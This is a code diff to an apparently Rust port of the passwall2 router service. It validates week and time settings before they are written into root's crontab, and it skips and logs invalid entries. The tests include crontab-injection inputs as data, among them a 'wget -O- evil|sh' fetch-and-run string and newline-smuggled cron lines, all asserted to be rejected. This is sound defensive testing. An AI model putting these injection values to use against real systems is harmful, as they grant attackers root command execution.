@@ -1383,13 +1383,23 @@ pub fn start_socks(ctx: &Ctx, cfg: &Config) {
 
 // ====================================================================== cron
 
-/// cron time spec `"<mm> <hh> * * <week|*>"` from week mode and `HH:MM`.
-pub fn cron_time(week: &str, time: &str) -> String {
-    let mut it = time.split(':');
-    let hh = it.next().unwrap_or("");
-    let mm = it.next().unwrap_or("");
-    let w = if week == "7" { "*" } else { week };
-    format!("{} {} * * {}", mm, hh, w)
+/// cron time spec `"<mm> <hh> * * <week|*>"` from week mode and `H:MM`/`HH:MM`.
+///
+/// The values are written verbatim into root's crontab, so they are validated (upstream does
+/// not): week mode `0`..`7` (`7` = every day) or `*`, time a LuCI `timehhmm` (an empty time
+/// takes the UI default `0:00`). None for anything else (the entry is skipped).
+pub fn cron_time(week: &str, time: &str) -> Option<String> {
+    let w = match week {
+        "7" | "*" => "*",
+        w if w.len() == 1 && (b'0'..=b'6').contains(&w.as_bytes()[0]) => w,
+        _ => return None,
+    };
+    let time = if time.is_empty() { "0:00" } else { time };
+    if !crate::api::is_timehhmm(time) {
+        return None;
+    }
+    let (hh, mm) = time.split_once(':')?;
+    Some(format!("{} {} * * {}", mm, hh, w))
 }
 
 const CRONTAB: &str = "/etc/crontabs/root";
@@ -1432,6 +1442,14 @@ fn cron_restart() {
 /// `(msgid, args)` of a log line to emit.
 pub type LogMsg = (String, Vec<String>);
 
+/// Append `"<spec> <cmd>"`, or log why an entry with an invalid week/time was skipped.
+fn push_cron(lines: &mut Vec<String>, logs: &mut Vec<LogMsg>, spec: Option<String>, cmd: &str) {
+    match spec {
+        Some(t) => lines.push(format!("{} {}", t, cmd)),
+        None => logs.push(("Scheduled tasks: invalid week/time setting, task skipped: %s".into(), vec![cmd.split(" > ").next().unwrap_or(cmd).to_string()])),
+    }
+}
+
 /// Cron lines written by `start_crontab` (pure; returns (lines, update_loop, log msgs)).
 pub fn crontab_entries(cfg: &Config, setsid: bool) -> (Vec<String>, bool, Vec<LogMsg>) {
     let ss = if setsid { "setsid " } else { "" };
@@ -1442,12 +1460,12 @@ pub fn crontab_entries(cfg: &Config, setsid: bool) -> (Vec<String>, bool, Vec<Lo
     let d = "@global_delay[0]";
     let stop_w = cfg.s(d, "stop_week_mode");
     if !stop_w.is_empty() {
-        lines.push(format!("{} {}/etc/init.d/passwall2 stop cron > /dev/null 2>&1 &", cron_time(&stop_w, &cfg.s(d, "stop_time_mode")), ss));
+        push_cron(&mut lines, &mut logs, cron_time(&stop_w, &cfg.s(d, "stop_time_mode")), &format!("{}/etc/init.d/passwall2 stop cron > /dev/null 2>&1 &", ss));
         logs.push(("Scheduled tasks: Auto stop service.".into(), vec![]));
     }
     let start_w = cfg.s(d, "start_week_mode");
     if !start_w.is_empty() {
-        lines.push(format!("{} {}/etc/init.d/passwall2 start cron > /dev/null 2>&1 &", cron_time(&start_w, &cfg.s(d, "start_time_mode")), ss));
+        push_cron(&mut lines, &mut logs, cron_time(&start_w, &cfg.s(d, "start_time_mode")), &format!("{}/etc/init.d/passwall2 start cron > /dev/null 2>&1 &", ss));
         logs.push(("Scheduled tasks: Auto start service.".into(), vec![]));
     }
     let restart_w = cfg.s(d, "restart_week_mode");
@@ -1455,7 +1473,7 @@ pub fn crontab_entries(cfg: &Config, setsid: bool) -> (Vec<String>, bool, Vec<Lo
         if restart_w == "8" {
             update_loop = true;
         } else {
-            lines.push(format!("{} {}/etc/init.d/passwall2 restart cron > /dev/null 2>&1 &", cron_time(&restart_w, &cfg.s(d, "restart_time_mode")), ss));
+            push_cron(&mut lines, &mut logs, cron_time(&restart_w, &cfg.s(d, "restart_time_mode")), &format!("{}/etc/init.d/passwall2 restart cron > /dev/null 2>&1 &", ss));
         }
         logs.push(("Scheduled tasks: Auto restart service.".into(), vec![]));
     }
@@ -1465,26 +1483,29 @@ pub fn crontab_entries(cfg: &Config, setsid: bool) -> (Vec<String>, bool, Vec<Lo
         if rules_w == "8" {
             update_loop = true;
         } else {
-            lines.push(format!("{} {}{} rule-update log all cron > /dev/null 2>&1 &", cron_time(&rules_w, &cfg.s(r, "update_time_mode")), ss, me));
+            push_cron(&mut lines, &mut logs, cron_time(&rules_w, &cfg.s(r, "update_time_mode")), &format!("{}{} rule-update log all cron > /dev/null 2>&1 &", ss, me));
         }
         logs.push(("Scheduled tasks: Auto update rules.".into(), vec![]));
     }
-    let mut groups: std::collections::BTreeMap<String, Vec<String>> = std::collections::BTreeMap::new();
+    // grouped by (week, time) like upstream's "<week>_<time>" keys
+    let mut groups: std::collections::BTreeMap<(String, String), Vec<String>> = std::collections::BTreeMap::new();
     for s in cfg.sections_of("subscribe_list") {
         let w = s.s("update_week_mode");
         if !w.is_empty() {
-            groups.entry(format!("{}_{}", w, s.s("update_time_mode"))).or_default().push(s.name.clone());
+            let t = if w == "8" { String::new() } else { s.s("update_time_mode") };
+            groups.entry((w, t)).or_default().push(s.name.clone());
             logs.push(("Scheduled tasks: Auto update [%s] subscription.".into(), vec![s.s("remark")]));
         }
     }
-    for (name, ids) in groups {
-        let mut it = name.split('_');
-        let w = it.next().unwrap_or("");
-        let t = it.next().unwrap_or("");
+    for ((w, t), ids) in groups {
         if w == "8" {
             update_loop = true;
         } else {
-            lines.push(format!("{} {}{} subscribe start {} cron > /dev/null 2>&1 &", cron_time(w, t), ss, me, ids.join(",")));
+            // section names come from UCI (`[A-Za-z0-9_]`); refuse anything else as well
+            let ids: Vec<String> = ids.into_iter().filter(|i| crate::rpc::is_sid(i)).collect();
+            if !ids.is_empty() {
+                push_cron(&mut lines, &mut logs, cron_time(&w, &t), &format!("{}{} subscribe start {} cron > /dev/null 2>&1 &", ss, me, ids.join(",")));
+            }
         }
     }
     (lines, update_loop, logs)
@@ -2285,8 +2306,22 @@ mod tests {
 
     #[test]
     fn t_cron() {
-        assert_eq!(cron_time("7", "04:30"), "30 04 * * *");
-        assert_eq!(cron_time("1", "4:05"), "05 4 * * 1");
+        assert_eq!(cron_time("7", "04:30").as_deref(), Some("30 04 * * *"));
+        assert_eq!(cron_time("1", "4:05").as_deref(), Some("05 4 * * 1"));
+        assert_eq!(cron_time("0", "").as_deref(), Some("00 0 * * 0"));
+        assert_eq!(cron_time("8", "1:00"), None);
+        assert_eq!(cron_time("* /bin/sh -c 'wget -O- evil|sh' #", "1:00"), None);
+        assert_eq!(cron_time("1\n* * * * * id", "1:00"), None);
+        assert_eq!(cron_time("1", "1:00 * * * id #"), None);
+        assert_eq!(cron_time("1", "1:00\n* * * * * id"), None);
+        assert_eq!(cron_time("1", "24:00"), None);
+        let bad = Config::parse(
+            "passwall2",
+            "config global_delay\n\toption stop_week_mode '* /bin/sh -c id #'\n\toption stop_time_mode '1:00'\nconfig subscribe_list 's1'\n\toption update_week_mode '1'\n\toption update_time_mode '1:00\n* * * * * id'\n",
+        );
+        let (lines, _, logs) = crontab_entries(&bad, false);
+        assert!(lines.is_empty(), "{:?}", lines);
+        assert!(logs.iter().any(|(m, _)| m.starts_with("Scheduled tasks: invalid")));
         let c = Config::parse(
             "passwall2",
             "config global_delay\n\toption stop_week_mode '7'\n\toption stop_time_mode '1:00'\n\toption restart_week_mode '8'\nconfig global_rules\n\toption update_week_mode '2'\n\toption update_time_mode '3:15'\nconfig subscribe_list 's1'\n\toption remark 'A'\n\toption update_week_mode '7'\n\toption update_time_mode '5:00'\nconfig subscribe_list 's2'\n\toption remark 'B'\n\toption update_week_mode '7'\n\toption update_time_mode '5:00'\n",
